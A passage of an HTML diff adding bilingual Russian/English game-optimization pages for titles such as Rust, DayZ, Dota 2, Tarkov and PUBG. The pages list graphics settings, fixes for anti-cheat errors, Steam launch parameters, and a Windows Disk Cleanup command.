+                        <li><i class="fas fa-microphone"></i> <span class="lang-ru">В настройках звука Windows выберите правильное устройство</span><span class="lang-en">In Windows sound settings, select correct device</span></li>
+                        <li><i class="fas fa-microphone"></i> <span class="lang-ru">В Steam: Настройки → Голос → Проверка микрофона</span><span class="lang-en">In Steam: Settings → Voice → Microphone test</span></li>
+                        <li><i class="fas fa-microphone"></i> <span class="lang-ru">В CS2: Настройки → Аудио → Устройство голосового чата</span><span class="lang-en">In CS2: Settings → Audio → Voice chat device</span></li>
+                        <li><i class="fas fa-microphone"></i> <span class="lang-ru">Проверьте уровень громкости микрофона</span><span class="lang-en">Check microphone volume level</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Оптимизация графики</h3>
+                    <h3 class="lang-en">Graphics optimization</h3>
+                    <p class="lang-ru">В настройках графики установите:</p>
+                    <p class="lang-en">In graphics settings set:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Разрешение экрана: Нативное</span><span class="lang-en">Screen resolution: Native</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим отображения: Полноэкранный</span><span class="lang-en">Display mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Многопотоковая рендеризация: Включено</span><span class="lang-en">Multicore rendering: Enabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Теневое качество: Низкое</span><span class="lang-en">Shadow quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: Среднее</span><span class="lang-en">Texture quality: Medium</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3 class="lang-ru">Решение проблемы с Faceit античитом</h3>
+                    <h3 class="lang-en">Fixing Faceit anti-cheat issues</h3>
+                    <p class="lang-ru">Для корректной работы с Faceit античитом:</p>
+                    <p class="lang-en">For proper work with Faceit anti-cheat:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите все наложения (Steam, Discord)</span><span class="lang-en">Disable all overlays (Steam, Discord)</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите Faceit клиент при проблемах</span><span class="lang-en">Reinstall Faceit client if issues persist</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rust Page -->
+        <div id="rust-page" class="game-page">
+            <button class="back-btn" id="back-btn-rust"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-hammer"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Rust</h2>
+                    <p class="lang-ru">Оптимизация для стабильного FPS в выживании с открытым миром</p>
+                    <p class="lang-en">Optimization for stable FPS in open-world survival</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "EAC disconnected"</h3>
+                    <h3 class="lang-en">Fixing "EAC disconnected" error</h3>
+                    <p class="lang-ru">Проблемы с античитом EasyAntiCheat:</p>
+                    <p class="lang-en">EasyAntiCheat issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите компьютер</span><span class="lang-en">Restart your computer</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте файрвол и антивирус</span><span class="lang-en">Check firewall and antivirus</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Запустите игру от имени администратора</span><span class="lang-en">Run game as administrator</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите EasyAntiCheat</span><span class="lang-en">Reinstall EasyAntiCheat</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для максимального FPS:</p>
+                    <p class="lang-en">Recommended settings for maximum FPS:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество графики: Простое</span><span class="lang-en">Graphics quality: Simple</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Расстояние прорисовки: 1500</span><span class="lang-en">Draw distance: 1500</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество теней: 0</span><span class="lang-en">Shadow quality: 0</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: 1</span><span class="lang-en">Texture quality: 1</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Анизотропная фильтрация: 1</span><span class="lang-en">Anisotropic filtering: 1</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Параллаксное окклюзия: 0</span><span class="lang-en">Parallax occlusion: 0</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с вылетами</h3>
+                    <h3 class="lang-en">Fixing crash issues</h3>
+                    <p class="lang-ru">Если игра вылетает при загрузке мира:</p>
+                    <p class="lang-en">If game crashes during world loading:</p>
+                    <ul>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Установите игру на SSD</span><span class="lang-en">Install game on SSD</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Увеличьте файл подкачки</span><span class="lang-en">Increase page file size</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Проверьте целостность файлов в Steam</span><span class="lang-en">Verify game files integrity in Steam</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Steam:</p>
+                    <p class="lang-en">Add in game properties in Steam:</p>
+                    <code>-window-mode exclusive -high -maxMem=14000 -cpuCount=4 -exThreads=8 -force-d3d11</code>
+                    <ul>
+                        <li><i class="fas fa-cog"></i> <code>-maxMem=14000</code> - <span class="lang-ru">ограничение использования RAM</span><span class="lang-en">RAM usage limit</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-cpuCount=4</code> - <span class="lang-ru">количество ядер CPU</span><span class="lang-en">number of CPU cores</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-exThreads=8</code> - <span class="lang-ru">количество потоков</span><span class="lang-en">number of threads</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-force-d3d11</code> - <span class="lang-ru">принудительный DirectX 11</span><span class="lang-en">forced DirectX 11</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- DayZ Page -->
+        <div id="dayz-page" class="game-page">
+            <button class="back-btn" id="back-btn-dayz"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-running"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>DayZ</h2>
+                    <p class="lang-ru">Оптимизация для плавного геймплея в выживании с зомби</p>
+                    <p class="lang-en">Optimization for smooth gameplay in zombie survival</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "No message received"</h3>
+                    <h3 class="lang-en">Fixing "No message received" error</h3>
+                    <p class="lang-ru">Проблемы с подключением к серверам:</p>
+                    <p class="lang-en">Connection to servers issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте интернет-соединение</span><span class="lang-en">Check internet connection</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите VPN</span><span class="lang-en">Disable VPN</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте файрвол</span><span class="lang-en">Check firewall</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите игру и лаунчер</span><span class="lang-en">Restart game and launcher</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для максимального FPS:</p>
+                    <p class="lang-en">Recommended settings for maximum FPS:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество объектов: Низкое</span><span class="lang-en">Object quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: Нормальное</span><span class="lang-en">Texture quality: Normal</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество теней: Низкое</span><span class="lang-en">Shadow quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Сглаживание: Выключено</span><span class="lang-en">Anti-aliasing: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Постобработка: Низкая</span><span class="lang-en">Post-processing: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Дистанция прорисовки: 1000</span><span class="lang-en">Draw distance: 1000</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с лагами в городах</h3>
+                    <h3 class="lang-en">Fixing lag issues in cities</h3>
+                    <p class="lang-ru">Если игра тормозит в населенных пунктах:</p>
+                    <p class="lang-en">If game lags in populated areas:</p>
+                    <ul>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Установите игру на SSD</span><span class="lang-en">Install game on SSD</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Уменьшите дистанцию прорисовки</span><span class="lang-en">Reduce draw distance</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Steam:</p>
+                    <p class="lang-en">Add in game properties in Steam:</p>
+                    <code>-winxp -nosplash -skipIntro -cpuCount=4 -maxMem=8192 -exThreads=7</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Dota 2 Page -->
+        <div id="dota2-page" class="game-page">
+            <button class="back-btn" id="back-btn-dota2"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-fire"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Dota 2</h2>
+                    <p class="lang-ru">Оптимизация для максимального FPS в соревновательной MOBA</p>
+                    <p class="lang-en">Optimization for maximum FPS in competitive MOBA</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Failed to create D3D device"</h3>
+                    <h3 class="lang-en">Fixing "Failed to create D3D device" error</h3>
+                    <p class="lang-ru">Проблемы с графическими драйверами:</p>
+                    <p class="lang-en">Graphics drivers issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите разгон GPU</span><span class="lang-en">Disable GPU overclocking</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте целостность файлов игры</span><span class="lang-en">Verify game files integrity</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите DirectX</span><span class="lang-en">Reinstall DirectX</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Рендеринг: Vulkan</span><span class="lang-en">Rendering: Vulkan</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: Высокое</span><span class="lang-en">Texture quality: High</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Эффекты: Средние</span><span class="lang-en">Effects: Medium</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Тени: Низкие</span><span class="lang-en">Shadows: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Антиалиасинг: Выключено</span><span class="lang-en">Anti-aliasing: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Амбиентная окклюзия: Выключено</span><span class="lang-en">Ambient occlusion: Disabled</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с задержкой ввода</h3>
+                    <h3 class="lang-en">Fixing input lag issues</h3>
+                    <p class="lang-ru">Если чувствуется input lag:</p>
+                    <p class="lang-en">If you feel input lag:</p>
+                    <ul>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Включите параметр "Быстрый отклик"</span><span class="lang-en">Enable "Quick response" parameter</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Отключите вертикальную синхронизацию</span><span class="lang-en">Disable vertical sync</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Используйте проводное подключение мыши</span><span class="lang-en">Use wired mouse connection</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Steam:</p>
+                    <p class="lang-en">Add in game properties in Steam:</p>
+                    <code>-novid -high -threads 8 +fps_max 0 -dx11</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tarkov Page -->
+        <div id="tarkov-page" class="game-page">
+            <button class="back-btn" id="back-btn-tarkov"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-helmet-battle"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Escape from Tarkov</h2>
+                    <p class="lang-ru">Оптимизация для стабильного FPS на картах с большим количеством объектов</p>
+                    <p class="lang-en">Optimization for stable FPS on maps with many objects</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Bad Authorization"</h3>
+                    <h3 class="lang-en">Fixing "Bad Authorization" error</h3>
+                    <p class="lang-ru">Проблема с авторизацией в лаунчере:</p>
+                    <p class="lang-en">Launcher authorization issue:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите лаунчер Escape from Tarkov</span><span class="lang-en">Restart Escape from Tarkov launcher</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте интернет-соединение</span><span class="lang-en">Check internet connection</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите VPN и прокси</span><span class="lang-en">Disable VPN and proxy</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Очистите кэш DNS</span><span class="lang-en">Clear DNS cache</span>: <code>ipconfig /flushdns</code></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Оптимизация графических настроек</h3>
+                    <h3 class="lang-en">Graphics settings optimization</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для максимального FPS:</p>
+                    <p class="lang-en">Recommended settings for maximum FPS:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим экрана: Полноэкранный</span><span class="lang-en">Screen mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Текстуры: Средние/Низкие</span><span class="lang-en">Textures: Medium/Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Тени: Низкие</span><span class="lang-en">Shadows: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">LOD: 2</span><span class="lang-en">LOD: 2</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Общая видимость: 1000-1500</span><span class="lang-en">Overall visibility: 1000-1500</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">SSR: Выключено</span><span class="lang-en">SSR: Disabled</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с вылетами</h3>
+                    <h3 class="lang-en">Fixing crash issues</h3>
+                    <p class="lang-ru">Если игра вылетает во время загрузки или игры:</p>
+                    <p class="lang-en">If game crashes during loading or gameplay:</p>
+                    <ul>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Проверьте целостность файлов в лаунчере</span><span class="lang-en">Verify files integrity in launcher</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Отключите разгон видеокарты</span><span class="lang-en">Disable GPU overclocking</span></li>
+                        <li><i class="fas fa-bug"></i> <span class="lang-ru">Убедитесь, что достаточно оперативной памяти</span><span class="lang-en">Make sure you have enough RAM</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка файла подкачки</h3>
+                    <h3 class="lang-en">Page file setup</h3>
+                    <p class="lang-ru">Tarkov требует много оперативной памяти:</p>
+                    <p class="lang-en">Tarkov requires a lot of RAM:</p>
+                    <ul>
+                        <li><i class="fas fa-memory"></i> <span class="lang-ru">Установите файл подкачки на SSD</span><span class="lang-en">Set page file on SSD</span></li>
+                        <li><i class="fas fa-memory"></i> <span class="lang-ru">Размер: 1.5x от объема RAM</span><span class="lang-en">Size: 1.5x of RAM amount</span></li>
+                        <li><i class="fas fa-memory"></i> <span class="lang-ru">Минимум: 16 ГБ для комфортной игры</span><span class="lang-en">Minimum: 16 GB for comfortable gameplay</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3 class="lang-ru">Оптимизация через конфигурационные файлы</h3>
+                    <h3 class="lang-en">Configuration files optimization</h3>
+                    <p class="lang-ru">В файле <code>%USERPROFILE%\Documents\Escape from Tarkov\local.ini</code>:</p>
+                    <p class="lang-en">In file <code>%USERPROFILE%\Documents\Escape from Tarkov\local.ini</code>:</p>
+                    <code>
+[Graphic]
+RefreshRate=144
+ScreenMode=0
+VSync=0
+LobbyFPS=60
+GameFPS=144
+                    </code>
+                </div>
+            </div>
+        </div>
+
+        <!-- PUBG Page -->
+        <div id="pubg-page" class="game-page">
+            <button class="back-btn" id="back-btn-pubg"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-parachute-box"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>PUBG</h2>
+                    <p class="lang-ru">Оптимизация для плавного геймплея в королевской битве</p>
+                    <p class="lang-en">Optimization for smooth gameplay in battle royale</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Could not initialize BattlEye"</h3>
+                    <h3 class="lang-en">Fixing "Could not initialize BattlEye" error</h3>
+                    <p class="lang-ru">Проблема с античитом BattlEye:</p>
+                    <p class="lang-en">BattlEye anti-cheat issue:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите компьютер</span><span class="lang-en">Restart your computer</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте, не заблокирован ли BattlEye антивирусом</span><span class="lang-en">Check if BattlEye is blocked by antivirus</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Запустите игру от имени администратора</span><span class="lang-en">Run game as administrator</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите BattlEye</span><span class="lang-en">Reinstall BattlEye</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим экрана: Полноэкранный</span><span class="lang-en">Screen mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: Среднее</span><span class="lang-en">Texture quality: Medium</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Эффекты: Очень низкие</span><span class="lang-en">Effects: Very Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Постобработка: Очень низкая</span><span class="lang-en">Post-processing: Very Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Тени: Очень низкие</span><span class="lang-en">Shadows: Very Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Сглаживание: Выключено</span><span class="lang-en">Anti-aliasing: Disabled</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с микро-фризами</h3>
+                    <h3 class="lang-en">Fixing micro-stuttering issues</h3>
+                    <p class="lang-ru">Если игра периодически замирает:</p>
+                    <p class="lang-en">If game periodically freezes:</p>
+                    <ul>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Установите игру на SSD</span><span class="lang-en">Install game on SSD</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Убедитесь, что достаточно оперативной памяти</span><span class="lang-en">Make sure you have enough RAM</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Steam:</p>
+                    <p class="lang-en">Add in game properties in Steam:</p>
+                    <code>-USEALLAVAILABLECORES -malloc=system -sm4</code>
+                    <ul>
+                        <li><i class="fas fa-cog"></i> <code>-USEALLAVAILABLECORES</code> - <span class="lang-ru">использует все ядра CPU</span><span class="lang-en">uses all CPU cores</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-malloc=system</code> - <span class="lang-ru">оптимизация памяти</span><span class="lang-en">memory optimization</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-sm4</code> - <span class="lang-ru">улучшает производительность</span><span class="lang-en">improves performance</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Warface Page -->
+        <div id="warface-page" class="game-page">
+            <button class="back-btn" id="back-btn-warface"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Warface</h2>
+                    <p class="lang-ru">Оптимизация для максимального FPS в тактическом шутере</p>
+                    <p class="lang-en">Optimization for maximum FPS in tactical shooter</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
